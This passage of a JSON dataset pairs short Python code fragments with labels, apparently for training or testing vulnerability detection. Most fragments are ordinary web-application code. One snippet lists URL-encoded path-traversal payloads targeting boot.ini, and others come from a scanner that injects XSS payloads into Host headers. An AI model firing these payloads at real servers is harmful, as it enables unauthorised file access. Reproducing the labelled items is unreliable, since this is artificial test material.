0}, {"snippet_id": 18193, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\")", "label": 0}, {"snippet_id": 6737, "code": ", 'default_language') @property def base_url(self): \"\"\" Base URL of the IdP. The default base URL is constructed from the Request URI, but for example if there is a load balancer/SSL terminator in front", "label": 0}, {"snippet_id": 38540, "code": "), cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module", "label": 0}, {"snippet_id": 27428, "code": "=dt) def splitlines(text): \"\"\"Split text into lines.\"\"\" return text.splitlines() def split_br(text): return re.split(r'\\s*<br */>\\s*', text, flags=re.IGNORECASE) def encode_json(value): \"\"\"Dump base64-encoded", "label": 0}, {"snippet_id": 26724, "code": "%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '../../boot.ini%00', '../../", "label": 0}, {"snippet_id": 14312, "code": "'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns", "label": 0}, {"snippet_id": 28802, "code": ".select_servers(server=serv) \tfor server in servers: \t\tssh_port=server[10] \tssh=SSHClient() \tssh.load_system_host_keys() \tssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) \ttry: \t\tif ssh_enable==1: \t", "label": 0}, {"snippet_id": 45852, "code": "=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord) coord_dir=Submission(request.user, coordinator, request.fs, request.jt, properties).deploy() deployment_mapping['coord_%s_dir' ", "label": 0}, {"snippet_id": 17090, "code": "\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 20179, "code": " courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}", "label": 0}, {"snippet_id": 24505, "code": "(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly):", "label": 0}, {"snippet_id": 30523, "code": "'rows1') is not None: \trows=form.getvalue('rows1') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate", "label": 0}, {"snippet_id": 34782, "code": "(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self", "label": 0}, {"snippet_id": 8734, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\"", "label": 0}, {"snippet_id": 54215, "code": ",background='light sky blue').grid(row=5) Label(main, text=\"HTTP Proxy:\",background='light sky blue').grid(row=6) Label(main, text=\"Refresh:\",background='light sky blue').grid(row=7) Label(main, text=\"Crawl", "label": 0}, {"snippet_id": 19019, "code": "(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service", "label": 0}, {"snippet_id": 45342, "code": "\"application/json\") def gen_xml_coordinator(request): response={'status': -1} coordinator_dict=json.loads(request.POST.get('coordinator', '{}')) coordinator=Coordinator(data=coordinator_dict) response['status'", "label": 0}, {"snippet_id": 1987, "code": "\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload", "label": 0}, {"snippet_id": 51682, "code": ".auth.password_validation.NumericPasswordValidator', }, ] LANGUAGE_CODE='en-us' TIME_ZONE='UTC' USE_I18N=True USE_L10N=True USE_TZ=True LOCALE_PATHS=['locale'] LANGUAGE_COOKIE_NAME='dashboard_language'", "label": 0}, {"snippet_id": 13074, "code": "), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views", "label": 0}, {"snippet_id": 37713, "code": " comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t", "label": 0}, {"snippet_id": 20631, "code": "'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$", "label": 0}, {"snippet_id": 3569, "code": " logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\":", "label": 0}, {"snippet_id": 6182, "code": "\" Number of worker threads to start(integer). EduID IdP spawns multiple threads to make use of all CPU cores in the password pre-hash function. Number of threads should probably be about 2x number of cores", "label": 0}, {"snippet_id": 31656, "code": "\"Date\", \"conn\", source=source, alpha=0.5, color=' \t\tp[serv].legend.orientation=\"horizontal\" \t\tp[serv].legend.location=\"top_left\" \t\tp[serv].legend.padding=5 \t\t \tplots=[] \tfor key, value in p.items(): \t\tplots", "label": 0}, {"snippet_id": 10285, "code": " xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_", "label": 0}, {"snippet_id": 17790, "code": " not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id", "label": 0}]